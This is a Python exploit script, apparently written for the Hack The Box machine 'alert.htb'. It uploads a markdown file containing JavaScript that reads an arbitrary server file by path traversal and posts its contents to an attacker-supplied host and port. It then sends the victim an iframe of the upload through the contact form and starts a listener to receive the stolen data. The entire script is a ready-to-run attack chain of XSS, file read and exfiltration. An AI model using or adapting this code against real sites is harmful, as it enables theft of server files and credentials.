import requests
import io
import sys
import re
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

lhost = sys.argv[1]
lport = sys.argv[2]
file_to_read = sys.argv[3]

BASE_URL = "http://alert.htb"

def upload_markdown_file():
    file_content = f"""
<script>
fetch('{BASE_URL}/messages.php?file=../../../../../../..{file_to_read}')
  .then(response => response.text())
  .then(data => {{
    fetch('http://{lhost}:{lport}', {{
      method: 'POST',
      headers: {{
        'Content-Type': 'application/x-www-form-urlencoded'
      }},
      body: data
    }});
  }})
</script>
"""
    file_object = io.BytesIO(bytes(file_content.encode()))
    file_object.name = "exploit.md"

    files = {
        "file" : (file_object.name, file_object)
    }

    resp = requests.post(f"{BASE_URL}/visualizer.php", files=files)
    match = re.findall(r'href="([^"]+\.md)"', resp.text)

    if not match:
        return False
    
    return match[0]

def send_xss_exploit():
    md_share_url = upload_markdown_file()

    form_data = {
        "email": "xot@test.com",
        "message": f"<iframe src={md_share_url} />"
    }
    resp = requests.post(f"{BASE_URL}/contact.php", data=form_data)

    print("[+] Exploit fired.....")
    return



class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        print(post_data.decode('utf-8'))

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status": "success"}')
        sys.exit(0)

def run(port, server_class, handler_class):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'[+] Server started on port {port}...')
    httpd.serve_forever()

thread1 = threading.Thread(target=run, args=(int(lport), HTTPServer, SimpleHandler))
thread1.start()

send_xss_exploit()